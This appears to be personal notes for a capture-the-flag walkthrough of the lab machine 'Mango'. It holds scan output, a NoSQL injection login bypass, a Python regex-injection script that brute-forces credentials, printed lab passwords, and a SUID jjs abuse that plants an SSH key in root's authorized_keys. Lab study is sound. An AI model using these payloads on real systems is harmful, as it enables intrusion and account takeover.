@@ -1,0 +1,195 @@
+let's enumerate first:
+
+command: sudo rustscan -a 10.10.10.16
+result:
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,443 10.10.10.162
+result:
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Sweet & Juicy
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Mango | Search Base
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.16 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.18 (93%), Android 4.2.2 (Linux 3.4) (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.162/
+
+command: cat /etc/hosts
+result:
+10.10.10.162 staging-order.mango.htb mango.htb
+
+command: wfuzz -c -w burp-parameter-names.txt -H "Host: FUZZ.mango.htb" --hh 5152 https://10.10.10.162/  
+result:
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                            
+=====================================================================
+
+000000386:   400        12 L     53 W       443 Ch      "__amp_source_origin"                              
+000000388:   400        12 L     53 W       443 Ch      "_method"                                          
+000000387:   400        12 L     53 W       443 Ch      "_escaped_fragment_"                               
+000002652:   400        12 L     53 W       443 Ch      "http_host"                                        
+000004149:   400        12 L     53 W       443 Ch      "php_path"                                         
+000006186:   400        12 L     53 W       443 Ch      "utm_medium"                                       
+000006188:   400        12 L     53 W       443 Ch      "utm_term"                                         
+000006185:   400        12 L     53 W       443 Ch      "utm_content"                                      
+000006187:   400        12 L     53 W       443 Ch      "utm_source"                                       
+000006184:   400        12 L     53 W       443 Ch      "utm_campaign"   
+
+command: wfuzz -c -w burp-parameter-names.txt -H "Host: FUZZ.mango.htb" --hw 28 http://10.10.10.162/ 
+result:
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                            
+=====================================================================
+
+000000387:   400        12 L     53 W       442 Ch      "_escaped_fragment_"                               
+000000386:   400        12 L     53 W       442 Ch      "__amp_source_origin"                              
+000000388:   400        12 L     53 W       442 Ch      "_method"                                          
+000002652:   400        12 L     53 W       442 Ch      "http_host"                                        
+000004149:   400        12 L     53 W       442 Ch      "php_path"                                         
+000006188:   400        12 L     53 W       442 Ch      "utm_term"                                         
+000006185:   400        12 L     53 W       442 Ch      "utm_content" 
+
+access: https://10.10.10.162/
+access: https://10.10.10.162/analytics.php
+access: https://staging-order.mango.htb/
+access: http://staging-order.mango.htb/
+intercept login using burpsuite:
+POST / HTTP/1.1
+Host: staging-order.mango.htb
+Content-Length: 39
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://staging-order.mango.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://staging-order.mango.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=j5u0r1butclqpc1toaui0ifu2c
+Connection: close
+
+username=0xdf&password=0xdf&login=login
+
+read nosql injection:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#exploits
+
+let's change payload to this:
+username[$ne]=0xdf&password[$ne]=0xdf&login=login
+then forward.
+
+redirect to this: http://staging-order.mango.htb/home.php
+
+let's write our script:
+import string
+import sys
+import requests
+
+def brute_password(user):
+    password = ""
+    while True:
+        for c in string.ascii_letters + string.digits + string.punctuation:
+            if c in ["*", "+", ".", "?", "|", "\\"]:
+                continue
+            sys.stdout.write(f"\r[+] Password: {password}{c}")
+            sys.stdout.flush()
+            resp = requests.post(
+                "http://staging-order.mango.htb/",
+                data={
+                    "username": user,
+                    "password[$regex]": f"^{password}{c}.*",
+                    "login": "login",
+                },
+            )
+            if "We just started farming!" in resp.text:
+                password += c
+                resp = requests.post(
+                    "http://staging-order.mango.htb/",
+                    data={"username": user, "password": password, "login": "login"},
+                )
+                if "We just started farming!" in resp.text:
+                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
+                    return
+                break
+
+def brute_user(res):
+    found = False
+    for c in string.ascii_letters + string.digits:
+        sys.stdout.write(f"\r[*] Trying Username: {res}{c.ljust(20)}")
+        sys.stdout.flush()
+        resp = requests.post(
+            "http://staging-order.mango.htb/",
+            data={
+                "username[$regex]": f"^{res}{c}",
+                "password[$gt]": "",
+                "login": "login",
+            },
+        )
+        if "We just started farming!" in resp.text:
+            found = True
+            brute_user(res + c)
+    if not found:
+        print(f"\r[+] Found user: {res.ljust(20)}")
+        brute_password(res)
+
+brute_user("")
+
+let's run it:
+[+] Found user: admin                         
+[+] Found password for admin: t9KcS3>!0B#2        
+[+] Found user: mango                         
+[+] Found password for mango: h3mXK8RhU~f{]f5H    
+[*] Trying Username: 9  
+
+let's ssh mango.
+command: ssh mango@10.10.10.162
+password: h3mXK8RhU~f{]f5H
+
+target> su admin
+password: t9KcS3>!0B#2
+
+command: python3 -c 'import pty;pty.spawn("/bin/bash")'
+command: find / -user root -perm -4000 2>/dev/null -ls
+result:
+274666     12 -rwsr-sr--   1 root     admin              10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+let's exploit:
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+jjs> var FileWriter = Java.type("java.io.FileWriter");
+jjs> var fw=new FileWriter("/root/.ssh/authorized_keys");
+jjs> fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCroSMKFr+JQh7HxJ1af0mUSiJWfffU9QnSrmTK3aAuIU2MI+icN1MAaiXACV8Qnn0VEWPMqgM1OMtN9tGaI94AwuTWjzypxFmDi2D2GBzKaCWCho2Gtt+6TkKXdBegWIBwtFN76+uCbR5DnlZ7SQX9JYlRNwKPyHEQl+lOsGh3uEPJ/7H0V08GyHHz3q+kdLxil8GZfXvYiKU2LV1njU9ycrMSojKMGjk3xGDK2RjnroPZUw+IxZeu2EFirpKQFefAiMWT1ReUT1PxZdr17yNBSKrL8KOWdw4ZbDgDzEReKw1aMjiNg6/CBv1XGI6aZ46YQlLWX5DHOpOhnEJFYBdmcsZYVe+beRzXZoZlmXhtqN1/+mGsir0G0Pal+TmIagwVAbop4Ff12HIAjARwVG2lhqbNZR5DAkpMUCPwr42FkURHO/FiVVnldaatN+PCZbwHLleRcfOYnYKAvjgyB4GysZlTeQUiULeyy8D//bCxoj/WBSD2k+Rx5sRyNOM8dAk= donika@donika-kali");
+jjs> fw.close();
+
+command: ssh -i ~/.ssh/id_rsa root@10.10.10.162 
+command: cat /root/root.txt
+result: 
+2c810bcb1c89776b9a9f6b456b383f16
+
+resource:
+https://0xdf.gitlab.io/2020/04/18/htb-mango.html#recon
